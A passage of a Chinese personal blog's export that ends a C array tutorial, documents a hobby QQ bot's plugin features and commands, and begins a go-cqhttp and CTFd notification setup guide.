class="comment">//使用数组中的元素</span></span><br><span class="line">            <span class="keyword">if</span> (number[i] &gt; sum/cnt)&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, number[i]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/01/09/kAyqGXnPTxUwSo7.png" alt="image-20220109171512344"></p>
<h2 id="定义数组"><a href="#定义数组" class="headerlink" title="定义数组"></a>定义数组</h2><h3 id="语法格式"><a href="#语法格式" class="headerlink" title="语法格式"></a>语法格式</h3><p> &lt;类型&gt;变量名称[元素数量];</p>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> grades[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">double</span> weight[<span class="number">20</span>];</span><br></pre></td></tr></table></figure>
<p>注：元素数量必须是整数</p>
<h2 id="什么是数组"><a href="#什么是数组" class="headerlink" title="什么是数组"></a>什么是数组</h2><ul>
<li><p>是一种容器（放东西的东西），特点是：</p>
<p>1、其中的元素具有相同的数据类型</p>
<p>2、一旦创建，不能改变大小</p>
<p>3、*（数组中的元素在内存中是连续依次排列的）</p>
</li>
</ul>
<h2 id="int-a-10"><a href="#int-a-10" class="headerlink" title="int a[10]"></a>int a[10]</h2><ul>
<li>一个int的数组</li>
<li>10个单元：a[0], a[1], a[2], … a[9]</li>
<li>每个单元就是一个int类型的变量</li>
<li>可以出现在赋值的左边或右边</li>
<li>*在赋值左边的叫做左值</li>
</ul>
<h2 id="数组的单元"><a href="#数组的单元" class="headerlink" title="数组的单元"></a>数组的单元</h2><ul>
<li>数组的每个单元就是数组类型的一个变量</li>
<li>使用数组时放在[]中的数字叫做下标或索引，下表从0开始计数</li>
</ul>
<h2 id="有效的下标范围"><a href="#有效的下标范围" class="headerlink" title="有效的下标范围"></a>有效的下标范围</h2><ul>
<li>编译器和运行环境都不会检查数组下标是否越界，无论是对数组单元做读还是写</li>
<li>一旦程序运行，越界的数组访问可能造成问题，导致程序崩溃</li>
<li>segmentation fault</li>
<li>所以这是程序员的责任来保证程序只使用有效的下标值：[0,数组的大小-1]</li>
</ul>
<h2 id="长度为0的数组（图一乐）"><a href="#长度为0的数组（图一乐）" class="headerlink" title="长度为0的数组（图一乐）"></a>长度为0的数组（图一乐）</h2><p>int a[0];</p>
<p>可以存在，但是没用啊。。。</p>
<h2 id="实例练习1"><a href="#实例练习1" class="headerlink" title="实例练习1"></a>实例练习1</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>写一个程序，输入数量不确定的[0,9]范围内的整数，统计每一种数字出现的次数，输入-1表示结束。</p>
]]></content>
      <categories>
        <category>基础课程学习</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>一只枫酱</title>
    <url>/2021/12/28/%E4%B8%80%E5%8F%AA%E6%9E%AB%E9%85%B1/</url>
    <content><![CDATA[<h1 id="枫酱的功能简介"><a href="#枫酱的功能简介" class="headerlink" title="枫酱的功能简介"></a>枫酱的功能简介</h1><p>自己搭的一个小bot，写一下功能说明书。（此bot为自己开发搭建，本人水平极其有限，插件大多为白嫖或二开，少部分原创）。功能仍在持续更新中。</p>
<p>1.25日更新：全架构更新，由nonebot2的a版本升级到了b版本。全插件更新，删除了抽卡、翻译插件（更新不了）。增加了更多的插件和功能。</p>
<span id="more"></span>
<h2 id="群聊-amp-私聊"><a href="#群聊-amp-私聊" class="headerlink" title="群聊&amp;私聊"></a>群聊&amp;私聊</h2><h3 id="B站推送"><a href="#B站推送" class="headerlink" title="B站推送"></a>B站推送</h3><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/kanomahoro/nonebot-hanayori"><em>基于NoneBot2的B站动态推送与开播提醒插件</em> </a></p>
<h4 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h4><p>超级用户(主人)、群主、管理员、私聊</p>
<h4 id="使用格式"><a href="#使用格式" class="headerlink" title="使用格式"></a>使用格式</h4><p><strong>在群聊中使用格式</strong>：@机器人 指令 UID</p>
<p><strong>在私聊中使用格式</strong>：指令 UID</p>
<p><strong>所有指令如下：</strong></p>
<ol>
<li><strong>关注 UID</strong> 添加新主播，UID为主播的B站UID</li>
<li><strong>取关 UID</strong> 取关主播，UID为主播的B站UID</li>
<li><strong>列表</strong> 显示当前关注列表</li>
<li><strong>开启动态 UID</strong> 开启B站动态推送</li>
<li><strong>关闭动态 UID</strong> 关闭B站动态推送</li>
<li><strong>开启直播 UID</strong> 开启开播提醒</li>
<li><strong>关闭直播 UID</strong> 关闭开播提醒</li>
<li><strong>开启全体 UID</strong> 开启开播@全体成员</li>
<li><strong>关闭全体 UID</strong> 关闭开播@全体成员</li>
<li><strong>帮助</strong> 顾名思义</li>
</ol>
<h4 id="示例图"><a href="#示例图" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2021/12/28/exHihP6n5op2Aqy.png" alt="image-20211228235235538"></p>
<p><img src="https://s2.loli.net/2021/12/28/mXp7Aj6i41wa2bQ.png" alt="123"></p>
<h3 id="沙雕图片"><a href="#沙雕图片" class="headerlink" title="沙雕图片"></a>沙雕图片</h3><h4 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/MeetWq/nonebot-plugin-petpet">制作头像相关的表情包</a></p>
<h4 id="权限-1"><a href="#权限-1" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-1"><a href="#使用格式-1" class="headerlink" title="使用格式"></a>使用格式</h4><ul>
<li>指令 + @user，如： 爬 @小Q</li>
<li>指令 + qq号，如：爬 123456</li>
<li>指令 + 自己，如：爬 自己</li>
<li>指令 + 图片</li>
</ul>
<h4 id="全部指令"><a href="#全部指令" class="headerlink" title="全部指令"></a>全部指令</h4><ul>
<li>摸、摸摸、rua</li>
<li>亲、亲亲</li>
<li>贴、贴贴、蹭、蹭蹭</li>
<li>顶、玩</li>
<li>拍</li>
<li>撕(很危险，不开放)</li>
<li>丢、扔</li>
<li>爬</li>
<li>精神支柱</li>
<li>一直</li>
<li>小天使</li>
<li>加载中</li>
<li>一样</li>
<li>不要靠近</li>
<li>玩游戏</li>
</ul>
<h4 id="示例图-1"><a href="#示例图-1" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2021/12/28/IDzHLvUETn8qB9m.png" alt="image-20211228235543472"></p>
<p><img src="https://s2.loli.net/2021/12/28/3x9VL4KvQ8fBDYr.png" alt="img"></p>
<p><img src="https://s2.loli.net/2021/12/28/V7b9KwqriegvCJL.png" alt="image-20211228235645656"></p>
<h3 id="表情包生成"><a href="#表情包生成" class="headerlink" title="表情包生成"></a>表情包生成</h3><h4 id="参考链接-2"><a href="#参考链接-2" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/MeetWq/nonebot-plugin-memes">用于表情包制作</a></p>
<h4 id="权限-2"><a href="#权限-2" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-2"><a href="#使用格式-2" class="headerlink" title="使用格式"></a>使用格式</h4><p>指令+文字。多段文字中间要加空格。（可以使用<code>表情包制作</code>关键词获取全部指令）</p>
<h4 id="全部指令-1"><a href="#全部指令-1" class="headerlink" title="全部指令"></a>全部指令</h4><p><img src="https://s2.loli.net/2022/01/26/EZqNIoelThGDSgC.png" alt="image-20220126224647434"></p>
<h4 id="示例图-2"><a href="#示例图-2" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2021/12/28/f9QFwq82g6k7xXy.png" alt="image-20211228235848593"></p>
<p><img src="https://s2.loli.net/2021/12/29/IMgxpd3JWwDsoEz.png" alt="image-20211229000233636"></p>
<h3 id="emoji合成"><a href="#emoji合成" class="headerlink" title="emoji合成"></a>emoji合成</h3><p>如果下载出错，则是api连接失败，等等再玩。</p>
<h4 id="参考链接-3"><a href="#参考链接-3" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/MeetWq/nonebot-plugin-emojimix">适用于 nonebot2的 emoji 合成器</a></p>
<h4 id="权限-3"><a href="#权限-3" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-3"><a href="#使用格式-3" class="headerlink" title="使用格式"></a>使用格式</h4><p>[emoji1]+[emoji2]</p>
<h4 id="示例图-3"><a href="#示例图-3" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2022/01/26/MZNJtwbOjvfQr98.png" alt="image-20220126231118684"></p>
<h3 id="logo生成"><a href="#logo生成" class="headerlink" title="logo生成"></a>logo生成</h3><h4 id="参考链接-4"><a href="#参考链接-4" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/MeetWq/nonebot-plugin-logo">用于xxxxHub 等风格logo制作</a></p>
<h4 id="权限-4"><a href="#权限-4" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-4"><a href="#使用格式-4" class="headerlink" title="使用格式"></a>使用格式</h4><p>指令+文字（注意有分段的要加空格）</p>
<h4 id="全部指令-2"><a href="#全部指令-2" class="headerlink" title="全部指令"></a>全部指令</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ph Porn Hub</span><br><span class="line">yt You Tube</span><br><span class="line">5000兆 我去 初音未来</span><br><span class="line">douyin douyin</span><br><span class="line">google Google</span><br></pre></td></tr></table></figure>
<h4 id="示例图-4"><a href="#示例图-4" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2022/01/26/vWlkBGOp25zxXY4.png" alt="image-20220126232255742"></p>
<h3 id="人生重开模拟器"><a href="#人生重开模拟器" class="headerlink" title="人生重开模拟器"></a>人生重开模拟器</h3><h4 id="参考链接-5"><a href="#参考链接-5" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/MeetWq/nonebot-plugin-remake">适用于Nonebot2的人生重开模拟器</a></p>
<h4 id="权限-5"><a href="#权限-5" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-5"><a href="#使用格式-5" class="headerlink" title="使用格式"></a>使用格式</h4><p>@枫酱 remake/liferestart/人生重开/人生重来</p>
<h4 id="示例图-5"><a href="#示例图-5" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2022/01/26/VjKS3k6d9sz8lxa.jpg" alt="img"></p>
<h4 id="注"><a href="#注" class="headerlink" title="注"></a>注</h4><p>私聊模式下，没有群聊转发功能，会出现大段文字。下一个插件彩云小梦续写相同。</p>
<h3 id="AI续写"><a href="#AI续写" class="headerlink" title="AI续写"></a>AI续写</h3><h4 id="参考链接-6"><a href="#参考链接-6" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/MeetWq/nonebot-plugin-caiyunai">采用小梦续写</a></p>
<h4 id="权限-6"><a href="#权限-6" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-6"><a href="#使用格式-6" class="headerlink" title="使用格式"></a>使用格式</h4><p>@机器人 续写/彩云小梦 xxx</p>
<h4 id="示例图-6"><a href="#示例图-6" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2022/01/26/7zTqjiWrDfH3X6N.jpg" alt="img"></p>
<h3 id="网易云点歌"><a href="#网易云点歌" class="headerlink" title="网易云点歌"></a>网易云点歌</h3><h4 id="参考链接-7"><a href="#参考链接-7" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/maxesisn/nonebot_plugin_songpicker2">数据源为网易云音乐</a></p>
<h4 id="权限-7"><a href="#权限-7" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-7"><a href="#使用格式-7" class="headerlink" title="使用格式"></a>使用格式</h4><p>点歌+歌曲名，从插件所给的候选项中选择歌曲。</p>
<h4 id="示例图-7"><a href="#示例图-7" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2022/01/26/l7yZecAtj8O1naH.png" alt="image-20220126232857472"></p>
<h3 id="塔罗牌占卜"><a href="#塔罗牌占卜" class="headerlink" title="塔罗牌占卜"></a>塔罗牌占卜</h3><p>根据初代作者所说，塔罗牌准确度并不高，图一乐即可。群聊转发模式有bug，开启后会报错，暂时无法解决，只能一张一张地发。</p>
<h4 id="参考链接-8"><a href="#参考链接-8" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/KafCoppelia/nonebot_plugin_tarot">塔罗牌</a></p>
<h4 id="权限-8"><a href="#权限-8" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-8"><a href="#使用格式-8" class="headerlink" title="使用格式"></a>使用格式</h4><p>塔罗牌/占卜</p>
<h4 id="示例图-8"><a href="#示例图-8" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2022/01/26/VgmwliW96XJvRKT.png" alt="image-20220126230507765"></p>
<h3 id="AI聊天（原创）"><a href="#AI聊天（原创）" class="headerlink" title="AI聊天（原创）"></a>AI聊天（原创）</h3><p>采用腾讯云自然语言处理闲聊功能。</p>
<h4 id="权限-9"><a href="#权限-9" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-9"><a href="#使用格式-9" class="headerlink" title="使用格式"></a>使用格式</h4><p>理论上应该是匹配“枫酱，”（中文逗号）。</p>
<p>但是莫名其妙出了bug，匹配“枫酱”亦可以运行。</p>
<p>不知道啥原因。。。建议第一种吧，不要去挑战bug。</p>
<p><strong>格式：</strong></p>
<p>枫酱，/枫酱+想说的话</p>
<h4 id="示例图-9"><a href="#示例图-9" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2021/12/28/y3l5FuQWeodx1OS.png" alt="img"></p>
<h4 id="额外"><a href="#额外" class="headerlink" title="额外"></a>额外</h4><p>同样加入了输入的黑名单检测功能。请不要触发敏感词。具体请参考wordbank中的额外部分。</p>
<h3 id="wordbank（白嫖-深度二开）"><a href="#wordbank（白嫖-深度二开）" class="headerlink" title="wordbank（白嫖+深度二开）"></a>wordbank（白嫖+深度二开）</h3><p>哇，终于到这插件了。。。</p>
<h4 id="参考链接-9"><a href="#参考链接-9" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/Joenothing-lst/word-bank"><em>无数据库的轻量问答插件</em> </a></p>
<h4 id="权限（深度修改过）"><a href="#权限（深度修改过）" class="headerlink" title="权限（深度修改过）"></a>权限（深度修改过）</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center"></th>
<th style="text-align:center">超级用户</th>
<th style="text-align:center">群主</th>
<th style="text-align:center">群管理</th>
<th style="text-align:center">私聊好友</th>
<th style="text-align:center">群好友</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">增加词条</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">×</td>
</tr>
<tr>
<td style="text-align:center">删除词条</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">×</td>
</tr>
<tr>
<td style="text-align:center">增加全局词条</td>
<td style="text-align:center">√</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
</tr>
<tr>
<td style="text-align:center">删除全局词条</td>
<td style="text-align:center">√</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
</tr>
<tr>
<td style="text-align:center">删除词库</td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">×</td>
<td style="text-align:center">√</td>
<td style="text-align:center">×</td>
</tr>
<tr>
<td style="text-align:center">删除全局词库</td>
<td style="text-align:center">√</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
</tr>
<tr>
<td style="text-align:center">删除全部词库</td>
<td style="text-align:center">√</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
<td style="text-align:center">×</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>注：私聊好友个人也可以建立属于自己的词库，与群词库是同级且独立的。</li>
</ul>
<h4 id="使用格式-10"><a href="#使用格式-10" class="headerlink" title="使用格式"></a>使用格式</h4><ul>
<li><p>使用方法：</p>
<ul>
<li><p>设置词条命令由<code>问句</code>和<code>答句</code>组成。设置之后，收到<code>消息</code>时触发。并非所有人都可以设置词条，详见<a href="https://github.com/Joenothing-lst/word-bank#permission">权限</a></p>
</li>
<li><p><code>问句</code>及其关键字</p>
<ul>
<li><p>问，当<code>问句</code>和<code>消息</code>全等时才会匹配（所有人均可以使用）<br>例子：问他不理答你被屏蔽了</p>
<p>| 消息     | 回复       |<br>| ———— | ————— |<br>| 他不理   | 你被屏蔽了 |<br>| 他不理我 | -          |<br>| 你不理我 | -          |</p>
</li>
<li><p>模糊问，当<code>问句</code>出现在<code>消息</code>里时则会匹配（只有超级用户可以使用）<br>例子：模糊问他不理答你被屏蔽了</p>
<p>| 消息     | 回复       |<br>| ———— | ————— |<br>| 他不理   | 你被屏蔽了 |<br>| 他不理我 | 你被屏蔽了 |<br>| 你不理我 | -          |</p>
</li>
<li><p>正则问，当<code>问句</code>被<code>消息</code>正则捕获时则会匹配（只有超级用户可以使用）<br>例子：正则问[他你]不理答你被屏蔽了</p>
<p>| 消息     | 回复       |<br>| ———— | ————— |<br>| 他不理   | 你被屏蔽了 |<br>| 他不理我 | 你被屏蔽了 |<br>| 你不理我 | 你被屏蔽了 |</p>
</li>
<li><p>全局问，在所有群聊和私聊中都可以触发，可以和以上几种组合使用。（只有超级用户可以使用）<br>例子：全局模糊问不理我答你被屏蔽了</p>
</li>
</ul>
</li>
<li><p><code>答句</code></p>
<ul>
<li><p><code>/at</code> + <code>qq号</code>，当答句中包含<code>/at</code> + <code>qq号</code>时将会被替换为@某人（即<code>CQ码</code>）<br>例子：问群主在吗答/at123456789在吗</p>
<p>| 群主qq号  | 消息     | 回复       |<br>| ————- | ———— | ————— |<br>| 123456789 | 群主在吗 | @群主 在吗 |</p>
</li>
<li><p><code>/self</code>，当答句中包含<code>/self</code>时将会被替换为发送者的群昵称<br>例子：问你好答/self你好啊</p>
<p>| 发送者 | 消息 | 回复       |<br>| ——— | —— | ————— |<br>| 皆无   | 你好 | 皆无你好啊 |</p>
</li>
<li><p><code>/atself</code>，当答句中包含<code>/atself</code>时将会被替换为@发送者 例子：问你好答/atself你好啊</p>
<p>| 发送者 | 消息 | 回复        |<br>| ——— | —— | —————- |<br>| 皆无   | 你好 | @皆无你好啊 |</p>
</li>
<li><p><code>/ban</code>，当答句中包含<code>/ban</code>后紧跟数字时将会禁言发送者，单位为秒，默认为300 例子：问你好答/ban30你将被禁言30秒</p>
</li>
</ul>
</li>
<li><p>删除</p>
<ul>
<li>删除词条+需要删除的<code>问句</code><br>例子：删除词条你好</li>
<li>删除全局词条+需要删除的<code>问句</code><br>例子：删除全局词条你好</li>
<li>删除全局词库<br>例子：删除全局词库</li>
<li>删除全部词库<br>例子：删除全部词库</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="修复离谱bug"><a href="#修复离谱bug" class="headerlink" title="修复离谱bug"></a>修复离谱bug</h4><p>原版的bug真的是一堆了。在<strong>问</strong>和<strong>答</strong>中间加上一些空格，就能直接让词条变成不可删除状态。这bug。。。总之，修了。问答中间不允许出现空格。</p>
<h4 id="示例图-10"><a href="#示例图-10" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2021/12/29/hLpeNSjOIG9gqrU.png" alt="image-20211229000614211"></p>
<h4 id="额外-1"><a href="#额外-1" class="headerlink" title="额外"></a>额外</h4><p>原先权限设置的很开，用户可以肆无忌惮的加全局词库，互相干扰。于是把权限缩小了。</p>
<p>原先权限设置的很死，群聊用户没人权。于是把权限放开了。</p>
<p>但是！放开权限意味着更加危险，我可不想因为小号进去了！！！</p>
<p>所以，加了黑名单功能。懂得都懂，直接用一个单独加的测试黑名单进行演示（枫霜月雨是全宇宙最帅的人）。</p>
<p><img src="https://s2.loli.net/2021/12/28/wiPuF236oOvVQDR.png" alt="img"></p>
<p><img src="https://s2.loli.net/2021/12/28/Qn21OWAJREGsV8w.png" alt="img"></p>
<p>黑名单设置的不严，希望给群友和好友更好的体验。但是~一旦触发，你懂得。</p>
<blockquote>
<p>根据《治安管理处罚法》第二十五条第一款第一项的规定：散布谣言，谎报险情、警情或者以其他方法故意扰乱公共秩序的，处5日以上10日以下拘留，情节较轻的，处5日以下拘留。</p>
<p>同时，如果当事人的行为造成严重危害，依法追究刑事责任。</p>
</blockquote>
<p>希望人没事。</p>
<h3 id="创建别名"><a href="#创建别名" class="headerlink" title="创建别名"></a>创建别名</h3><p>玩不来，并且权限也有点问题。先挂个参考链接吧。</p>
<h4 id="参考链接-10"><a href="#参考链接-10" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/nonebot/discussions/discussions/74">为nonebot2的指令创建别名</a></p>
<h2 id="仅群聊"><a href="#仅群聊" class="headerlink" title="仅群聊"></a>仅群聊</h2><h3 id="QQ音乐点歌"><a href="#QQ音乐点歌" class="headerlink" title="QQ音乐点歌"></a>QQ音乐点歌</h3><h4 id="参考链接-11"><a href="#参考链接-11" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/kanomahoro/nonebot-simplemusic"><em>基于NoneBot2的最简点歌插件，支持网易云、QQ音乐</em> </a></p>
<h4 id="权限-10"><a href="#权限-10" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式（命令更新为qq点歌）"><a href="#使用格式（命令更新为qq点歌）" class="headerlink" title="使用格式（命令更新为qq点歌）"></a>使用格式（命令更新为qq点歌）</h4><ol>
<li>qq<strong>点歌 歌曲名</strong> 在QQ音乐中搜索指定歌曲，如果没有找到则不会有任何响应</li>
<li>qq<strong>点歌 歌曲名 歌手名</strong> 在QQ音乐中搜索指定歌曲，并试图匹配指定歌手，如果没有找到则不会有任何响应</li>
</ol>
<h4 id="示例图-11"><a href="#示例图-11" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2021/12/28/r4ERbCvitLkxBzP.png" alt="image-20211228234913372"></p>
<p><img src="https://s2.loli.net/2021/12/28/JpMxXb9j2SyKQL3.png" alt="image-20211228235029336"></p>
<h3 id="掷骰子"><a href="#掷骰子" class="headerlink" title="掷骰子"></a>掷骰子</h3><h4 id="参考链接-12"><a href="#参考链接-12" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/KafCoppelia/nonebot_plugin_roll">扔骰子</a></p>
<h4 id="权限-11"><a href="#权限-11" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-11"><a href="#使用格式-11" class="headerlink" title="使用格式"></a>使用格式</h4><p>rd [x]d[y]</p>
<p>x为数量，y为面数</p>
<h4 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h4><ol>
<li>x or y &gt;1024</li>
<li>x or y &lt;0</li>
<li><code>random.randint(1,100) == 99</code></li>
</ol>
<h4 id="示例图-12"><a href="#示例图-12" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2022/01/26/4BMrqbgEpCI8RKf.png" alt="image-20220126224600444"></p>
<h3 id="疯狂星期四"><a href="#疯狂星期四" class="headerlink" title="疯狂星期四"></a>疯狂星期四</h3><h4 id="参考链接-13"><a href="#参考链接-13" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/KafCoppelia/nonebot_plugin_crazy_thursday">Crazy Thursday</a></p>
<h4 id="权限-12"><a href="#权限-12" class="headerlink" title="权限"></a>权限</h4><p>所有人</p>
<h4 id="使用格式-12"><a href="#使用格式-12" class="headerlink" title="使用格式"></a>使用格式</h4><p>疯狂星期[一到日]</p>
<p>由于我不喜欢文案内容（我的枫酱这么可爱，怎么能说这样的话捏~）改了json里的很多东西。砍了一大半吧。</p>
<h4 id="示例图-13"><a href="#示例图-13" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2022/01/26/2HleKpDdCaINM7R.png" alt="image-20220126225429345"></p>
<h3 id="入群欢迎（原创）"><a href="#入群欢迎（原创）" class="headerlink" title="入群欢迎（原创）"></a>入群欢迎（原创）</h3><p>没啥介绍的，自己写的一个很简单的入群介绍功能，可以定制入群欢迎语。</p>
<h4 id="示例图-14"><a href="#示例图-14" class="headerlink" title="示例图"></a>示例图</h4><p><img src="https://s2.loli.net/2022/01/26/C9KXWht7GeFUjb5.png" alt="img"></p>
<h3 id="涩图"><a href="#涩图" class="headerlink" title="涩图"></a>涩图</h3><h4 id="不介绍，不开放"><a href="#不介绍，不开放" class="headerlink" title="不介绍，不开放"></a>不介绍，不开放</h4><h2 id="仅私聊"><a href="#仅私聊" class="headerlink" title="仅私聊"></a>仅私聊</h2><h3 id="定时早晚安（原创）"><a href="#定时早晚安（原创）" class="headerlink" title="定时早晚安（原创）"></a>定时早晚安（原创）</h3><p>技术上可拓展群聊，但是放群里功能鸡肋</p>
<p>定时任务，每天早上5:50和晚上22:00。推送早晚安消息。（城市可定制）</p>
<h3 id="示例图-15"><a href="#示例图-15" class="headerlink" title="示例图"></a>示例图</h3><p><img src="https://s2.loli.net/2021/12/28/WUHw1oNqmXGiVJx.png" alt="image-20211228234711323"></p>
<p><img src="https://s2.loli.net/2021/12/28/zIlHK8Q5fE7tbTM.png" alt="image-20211228234805242"></p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>bot</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfbot搭建指南</title>
    <url>/2021/11/19/ctfbot%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<h1 id="QQbot搭建记录"><a href="#QQbot搭建记录" class="headerlink" title="QQbot搭建记录"></a>QQbot搭建记录</h1><p>简单记录一下搭一个没有带脑子的qqbot的过程。</p>
<span id="more"></span>
<h2 id="无脑版（裸go-cqhttp"><a href="#无脑版（裸go-cqhttp" class="headerlink" title="无脑版（裸go-cqhttp)"></a>无脑版（裸go-cqhttp)</h2><p>从接口和<code>go-cqhttp</code></p>
<p>先去<a href="https://github.com/Mrs4s/go-cqhttp/releases">release</a>上下载，<code>wget</code>就行。</p>
<p>直接走一波<code>./go-cqhttp</code>，然后会出<code>config.yml</code>，如下配置。</p>
<p>反向代理加上脑子才需要，但是先挂出来吧。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- ws-reverse:</span><br><span class="line">    ## 反向WS Universal 地址</span><br><span class="line">    ## 注意 设置了此项地址后下面两项将会被忽</span><br><span class="line">    universal: ws:&#x2F;&#x2F;127.0.0.1:8080&#x2F;cqhttp&#x2F;ws</span><br><span class="line">    ## 反向WS API 地址</span><br><span class="line">    api: ws:&#x2F;&#x2F;127.0.0.1:8080&#x2F;cqhttp&#x2F;api</span><br><span class="line">    ## 反向WS Event 地址</span><br><span class="line">    event: ws:&#x2F;&#x2F;127.0.0.1:8080&#x2F;cqhttp&#x2F;event</span><br><span class="line">    ## 重连间隔 单位毫秒</span><br><span class="line">    reconnect-interval: 3000</span><br><span class="line">    middlewares:</span><br><span class="line">      &lt;&lt;: *default # 引用默认中间件</span><br></pre></td></tr></table></figure>
<p>然后不行试试<code>127.0.0.1</code>改<code>0.0.0.0</code></p>
<p>还有什么</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chmod 777 ./go-cqhttp</span><br></pre></td></tr></table></figure>
<p>接着执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ./go-cqhttp</span><br></pre></td></tr></table></figure>
<p>然后建议扫码登录。可以先测试下</p>
<p>测试成功后使用这个命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nohup ./go-cqhttp &gt; go.log 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
<p>到浏览器中输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:5700&#x2F;send_private_msg?user_id&#x3D;xxxxx&amp;message&#x3D;aaaa</span><br></pre></td></tr></table></figure>
<p>看看能不能收到消息，收到就成功了。</p>
<p>接着改<code>CTFd/CTFd/api/v1/challenges.py</code></p>
<p>加上这两部分</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">TODO:</span> Convert this into a re-useable decorator</span></span><br><span class="line"><span class="keyword">if</span> config.is_teams_mode() <span class="keyword">and</span> team <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    abort(<span class="number">403</span>)</span><br><span class="line"></span><br><span class="line">fails = Fails.query.filter_by(</span><br><span class="line">    account_id=user.account_id, challenge_id=challenge_id</span><br><span class="line">).count()</span><br><span class="line"></span><br><span class="line">challenge = Challenges.query.filter_by(<span class="built_in">id</span>=challenge_id).first_or_404()</span><br><span class="line"><span class="comment">#从这开始</span></span><br><span class="line">challenge_name=challenge.name</span><br><span class="line">challenge_category=challenge.category</span><br><span class="line">user_name=user.name <span class="comment">#这里结束</span></span><br><span class="line"><span class="keyword">if</span> challenge.state == <span class="string">&quot;hidden&quot;</span>:</span><br><span class="line">    abort(<span 